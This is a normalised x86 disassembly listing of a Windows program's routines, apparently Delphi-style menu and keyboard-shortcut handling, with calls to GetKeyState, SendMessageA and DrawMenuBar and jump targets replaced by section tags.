mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45c2dc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45c2fc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45c31c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45c33c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45c35c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45c37c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45c39c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45c3bc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418c90
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_456618
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_456750
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_4567b0
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_4564b0
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_456870
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45c434
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4212e8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45bb48
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45bfe4
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45c488
jmp r-xdata
xor edx edx
mov eax esi
call sub_459f4c
sub_45c488
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_457920
mov eax ebx
call sub_45c4f8
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_457964
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_42109c
sub_45c4d0
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45c4d0
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_459620
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45bf64
mov eax ebx
pop esi
pop ebx
retn
sub_45c50c
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c380
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4044b0
sub_45c53c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_403fe8
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_45c5c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45c6e2
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_404210
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_404210
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404470
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40435c
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c6e9
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f74
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4044f8
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4042d0
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_404210
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404470
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4042d0
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_45c720
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_45cbbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403fe8
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45cb80
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_45bb60
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_403fe8
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cbc6
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403f74
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403f74
lea eax [ ebp - 0x18 ]
call sub_403f50
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax ebx
call sub_45cd74
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_45bb70
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40435c
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_45c53c
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_45bb70
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45bb70
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403154
mov eax [ ebp - 0x20 ]
call sub_403154
mov eax [ ebp - 0x14 ]
call sub_403154
mov eax [ ebp - 0xc ]
call sub_403154
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_45c53c
pop ecx
mov eax [ ebp - 0x30 ]
call sub_404210
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_45bb70
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_45e618
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407d30
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403fa4
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c380
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c380
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_45bb70
push eax
mov edx esi
mov eax ebx
call sub_45bb70
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404470
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407d30
push ebp
mov eax [ ebp - 0x2c ]
call sub_45c50c
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_45c50c
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c380
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_403fe8
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45bb70
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_45bb70
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_45e584
mov edx [ ebp - 0x40 ]
pop eax
call sub_403fa4
mov edx esi
mov eax ebx
call sub_45bb70
push eax
mov edx esi
mov eax ebx
call sub_45bb70
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_404210
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404470
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_45c5c0
mov eax [ ebp - 0x18 ]
call sub_404210
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_4044b0
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_4044f8
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_45c5c0
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_45cc1c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45bb60
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45bb60
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45cda0
test al al
je r-xdata
mov eax esi
call sub_45bb60
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45bb70
call sub_45cbf8
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_45bb70
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45bb70
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45bb70
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45bb70
call sub_45cbf8
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45bb70
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45bb70
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45bb70
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_45bb70
call sub_45cbf8
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_45cd74
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_45cd74
and eax 0x7f
mov al [ eax + rw-data ]
sub_45cda0
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_45cda0
and eax 0x7f
mov al [ eax + rw-data ]
sub_45cdcc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_459ab4
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_420fcc
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_45daf8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_45ce68
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403154
mov eax [ esi + 0x44 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421018
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_45cedc
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45cedc
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_459620
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45bf64
mov eax ebx
pop esi
pop ebx
retn
sub_45cf1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_45bb60
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_45bb70
call sub_45cf1c
pop ecx
test al al
je r-xdata
sub_45cfb4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_45cf1c
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_459620
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_45cfe4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_45cfb4
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_45e308
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_45d054
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_45cfb4
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_45d070
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_45cfb4
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_45c720
mov ebx eax
xor edx edx
mov eax edi
call sub_45cc1c
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_45c088
mov eax [ esi + 0x34 ]
call sub_45c088
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_459fc4
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_45071c
push eax
call DrawMenuBar
sub_45d15c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_45d15c
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push j_sub_40361c#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_45cfb4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45c088
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_45d14c
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_45d2b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_429ba8
xor eax eax
push ebp
push sub_45d3ae
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_429ba8
xor eax eax
push ebp
push sub_45d383
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_45d15c
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_429ba0
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d3b5
mov eax [ rw-data ]
call sub_429ba0
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_45cfb4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_45d3d4
push ebx
push esi
add esp 0xffffff80
